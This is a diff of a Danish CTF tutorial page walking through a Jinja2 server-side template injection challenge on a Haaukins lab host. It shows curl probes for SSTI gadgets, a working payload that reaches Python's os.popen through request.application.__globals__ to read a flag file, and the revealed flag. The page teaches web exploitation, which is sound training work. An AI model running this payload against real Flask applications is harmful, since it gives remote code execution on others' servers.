@@ -22,16 +22,37 @@
 <div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Hvad går opgaven ud på?</h2>
-<p>En GET-param <code>name</code> reflekteres i en Jinja2-template. <code>{{7*7}}</code>→49 bekræfter
-             SSTI — men <code>cycler</code>/<code>lipsum</code> findes ikke her, så brug <code>request</code>:</p>
+<h2>Bekræft SSTI</h2>
+<p>En GET-param <code>name</code> reflekteres i en Jinja2-template, uden escaping af
+             template-syntaks:</p>
+             <pre><code>curl -G --data-urlencode "name={{7*7}}" http://ninjalair.hkn/
+# -> "Welcome to the ninja club, 49"</code></pre>
+             <p>49, ikke teksten "7*7" => serveren evaluerer input som template, ikke bare viser det.</p>
+<h2>Kortlæg hvad der er tilgængeligt, før du vælger RCE-kæde</h2>
+<p>Jinja2-SSTI har flere veje til RCE, og hvilken der virker afhænger af hvad template-
+             konteksten udstiller. Prøv de velkendte gadgets én for én i stedet for at gætte direkte:</p>
+             <pre><code>curl -G --data-urlencode "name={{config}}" http://ninjalair.hkn/      # virker
+curl -G --data-urlencode "name={{self}}" http://ninjalair.hkn/        # virker
+curl -G --data-urlencode "name={{cycler}}" http://ninjalair.hkn/      # undefined - findes ikke
+curl -G --data-urlencode "name={{lipsum}}" http://ninjalair.hkn/      # undefined - findes ikke
+curl -G --data-urlencode "name={{request}}" http://ninjalair.hkn/     # virker</code></pre>
+             <p>De to mest almindelige Flask-SSTI-gadgets (<code>cycler</code>, <code>lipsum</code>) mangler
+             her, men <code>request</code> er tilgængeligt og giver samme vej til Pythons builtins via
+             appens egne <code>__globals__</code>:</p>
              <pre><code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flaget lå i <code>/app/flag.txt</code> (appen kørte som root). Afleveres som DDC.</p>
         <p>Flag: <span class="flag">DDC{N1NJ45_4r3_C001}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>Kend flere Jinja2-RCE-kæder — den rette afhænger af hvilke globals der findes.</li><li><code>request.application.__globals__</code> er robust når <code>cycler</code>/<code>lipsum</code> mangler.</li><li>Prøv begge præfiks: her var flaget <code>DDC{...}</code>. Se også <a href="comment-all-you-want.html">comment-all-you-want</a>.</li></ul>
+<ul><li>Kend flere Jinja2-RCE-kæder; den rette afhænger af hvilke globals der findes.</li><li><code>request.application.__globals__</code> er robust når <code>cycler</code>/<code>lipsum</code> mangler.</li><li>Prøv begge præfiks: her var flaget <code>DDC{...}</code>. Se også <a href="comment-all-you-want.html">comment-all-you-want</a>.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Når du først har bekræftet SSTI med <code>{{7*7}}</code>, er resten at finde en vej fra et
+tilgængeligt objekt til Pythons indbyggede funktioner. Der findes mange kæder
+(<code>cycler</code>, <code>lipsum</code>, <code>request</code>, <code>self</code>), og hvilken
+der virker afhænger af hvad template-konteksten udstiller. At kende flere alternativer er pointen:
+når én gadget er filtreret eller mangler, prøver du den næste. Samme SSTI-grundbug som
+<a href="comment-all-you-want.html">comment-all-you-want</a>, blot med en anden kæde.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
